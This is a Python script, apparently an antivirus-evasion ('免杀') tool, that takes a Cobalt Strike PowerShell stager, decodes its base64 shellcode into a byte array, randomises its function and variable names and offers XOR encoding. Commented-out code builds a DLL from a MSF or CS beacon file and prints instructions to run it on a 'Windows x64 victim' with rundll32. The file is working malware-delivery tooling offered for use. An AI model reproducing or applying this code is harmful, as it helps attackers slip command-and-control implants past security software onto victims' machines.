#!/usr/bin/env python3
#  author: Komomon（github）
import sys
import random
import string
import os
import time
import platform
import argparse
import re
import base64


'''
目前实现，部分变量名称随机化替换
payload部分转为字节数组
todo：
    字节数组随机化分割，再拼接
    所有变量或关键词的随机化
'''


# a-zA-Z 生成一个长度为8-15的字符串
def get_random_string():
    # With combination of lower and upper case
    length = random.randint(8, 15)
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    # print random string
    return result_str


# def get


def xor(data):
    key = get_random_string()
    l = len(key)
    output_str = ""
    flag = 0
    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        o = lambda x: x if isinstance(x, int) else ord(x)  # 处理字节而不是字符串的数据 ord()函数主要用来返回对应字符的ascii码
        output_str += chr(o(current) ^ ord(current_key))  # 异或运算并加到一起
    ciphertext = ""
    for x in output_str:
        ciphertext += hex(ord(x)) + ", "
        flag += 1
        if flag == 15:
            ciphertext += "\n"
            flag = 0
    ciphertext = "{ " + ciphertext + "0x00};"
    # ciphertext = '{ ' + ', '.join(hex(ord(x)) for x in output_str) + ', 0x00};'  # 16进制结果拼接到数组中，hex(ord("x"))=0x78 取后两位
    # print(ciphertext)
    # ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ', 0x00};'  # hex(ord("x"))=0x78 取后两位
    # print(ciphertext)
    return ciphertext, key


# def list_random_slice(data_list):
#     slice_num = random.randint(5, 10)
#     result_list = []
#     length = len(data_list)
#     step = length // slice_num
#
#     for n in range(0, length, step):
#         # random_num = random.randint(1, length)
#         result_list.append(data_list[n:n + step])
#         # index += random_num
#         # length = length - random_num
#     # print(result_list)
#     return result_list


def charlotte(payload_file):
    try:
        # print(1)
        original = open(payload_file, "rt")  # 读取为字节以处理字符集解析问题
        data = original.read()
        # print(2)
    except Exception as e:
        print("err:", e)
        print("[*]                    Failed to read " + payload_file + " :(                [*]")
        print("[*]                    Missing " + payload_file + " in pwd?                  [*]")
        sys.exit(1)  # exit if read failed
    # print(3)
    # get base64 payload
    payload_base64 = re.findall(r"\[System.Convert]::FromBase64String\('(.*?)'\)", data)[0]
    # print(payload)
    byte_data = bytearray(base64.b64decode(payload_base64))
    # print(byte_data)
    byte_list = []
    # payload_type_str_list = []
    for i in byte_data:
        # baselist2.append(ord(i))
        byte_list.append(i)
    # payload_type_str_list = list_random_slice(byte_list)
    # print("result", result)
    # print(byte_list)

    payload_byte_str = "(" + ",".join(str(byte) for byte in byte_list) + ")"
    # for byte in byte_list:
    #     payload_byte_str += byte
    print(payload_byte_str)
    payload = "[Byte[]]" + payload_byte_str
    # data = data.replace(payload_base64,)
    data = re.sub(r"\[System.Convert]::FromBase64String\('(.*?)'\)", payload, data, 1)
    # payload = re.findall(r"\[System.Convert]::FromBase64String\('(.*?)'\)", data)[0]
    # print(data)
    # data = data.replace("[System.Convert]::FromBase64String", "[Byte[]]")

    func_fgpa_name = get_random_string()
    func_fgdt_name = get_random_string()
    var_str = get_random_string()
    param_x_name = get_random_string()
    resultps1_name = get_random_string()

    data = data.replace("func_get_proc_address", func_fgpa_name)
    data = data.replace("func_get_delegate_type", func_fgdt_name)
    data = data.replace("$var_", "$" + var_str)
    data = data.replace("$x", "$" + param_x_name)

    original.close()
    resultps1_name = "resultps1_name"
    resultps1 = open(resultps1_name + ".ps1", "w+")
    resultps1.write(data)
    time.sleep(1)
    print("[*]                  " + resultps1_name + ".ps1  generated!                    [*]")
    time.sleep(1)
    resultps1.close()
    return resultps1_name + ".ps1"


charlotte("csps64.ps1")

#
# def main(beaconbin_file):
#     # print(banner)
#
#     time.sleep(3)
#     try:
#         print("[*]                    Initialising charlotte()                    [*]")
#         time.sleep(1)
#         e1 = charlotte(beaconbin_file)
#     except Exception as e:
#         print("EEEE:", e)
#         print("[*]                    charlotte() failed? :(                      [*]")
#         sys.exit(1)  # exit if code generation failed
#     print("[*]                    Completed - Compiling " + e1 + ".dll         [*]")
#     time.sleep(1)
#     if platform.system() == "Windows":
#         print('windows')
#         print('windows 自行编译')
#     elif platform.system() == "Linux":
#         print('linux')
#         try:
#             # os.system("x86_64-w64-mingw32-g++ -shared -o charlotte.dll charlotte.cpp -fpermissive >/dev/null 2>&1")
#             os.system("x86_64-w64-mingw32-g++ -shared -o " + e1 + ".dll " + e1 + ".cpp -fpermissive >/dev/null 2>&1")
#             print("[*]                    Cross Compile Success!                      [*]")
#         except:
#             print("[*]                    Compilation failed :(                       [*]")
#         time.sleep(1)
#         # print("[*]                    Removing charlotte.cpp...                   [*]")
#         # os.system("rm " + e1 + ".cpp")
#         # time.sleep(1)
#
#     print("[*]                    Execute on your Windows x64 victim with:    [*]")
#     print("[*]                    rundll32 " + e1 + ".dll, " + e1 + "    [*]")
#     time.sleep(2)
#     print("\n")
#
#
# if __name__ == "__main__":
#     banner = """
#         Miansha Dll  Write By Komomon
#     """
#     print(banner)
#     parser = argparse.ArgumentParser(usage="", description="des")
#     parser.add_argument("-f", "--file", type=str, dest="file", default="beacon.bin", help="The raw file from MSF or CS")
#     # parser.add_argument("--port", type=int, dest="port", default=22, help="ports to scan")
#     # parser.add_argument("-t", "--timeout", type=int, default=10, dest="timeout", help="Request timeout")
#     # parser.add_argument("-u", "--user", type=str, required=True, dest="username", help="Username")
#     # parser.add_argument("-p", "--pass", type=str, required=True, dest="password", help="Password")
#     args = parser.parse_args()
#     Beacon_file = args.file
#     main(beaconbin_file=Beacon_file)
